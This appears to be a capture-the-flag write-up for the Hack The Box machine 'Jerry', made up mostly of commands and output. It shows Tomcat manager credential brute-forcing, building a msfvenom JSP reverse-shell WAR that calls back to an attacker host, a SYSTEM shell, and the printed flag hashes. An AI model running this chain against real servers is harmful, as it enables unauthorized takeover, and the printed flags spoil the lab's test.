# Jerry - https://www.hackthebox.com/machines/jerry

```bash
nmap -sV -sC -Pn 10.129.136.9
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-16 04:14 EDT
Nmap scan report for 10.129.136.9
Host is up (0.057s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.83 seconds
```
```bash
checking http://10.129.136.9:8080/
Asks for credentials
```
```bash
msfconsole
msf6 > search tomcat login

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/tomcat_mgr_login  .                normal  No     Tomcat Application Manager Login Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/tomcat_mgr_login

msf6 > use 0
```
```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 10.129.136.9
RHOSTS => 10.129.136.9
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
[+] 10.129.136.9:8080 - Login Successful: tomcat:s3cret
```
```
visit http://10.129.136.9:8080/manager/html
username: tomcat
password: s3cret
```
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.56 LPORT=9001 -f war > rev.war
Payload size: 1091 bytes
Final size of war file: 1091 bytes
```
```bash
 #upload rev.war
```
```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.56
LHOST => 10.10.14.56
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.56:9001
```
```bash
 # visit http://10.129.136.9:8080/rev/ 
[*] Command shell session 1 opened (10.10.14.56:9001 -> 10.129.136.9:49201) at 2024-05-16 05:14:13 -0400


Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----
          

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```
```bash
C:\apache-tomcat-7.0.88>cd ..
cd ..
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,419,576,832 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```


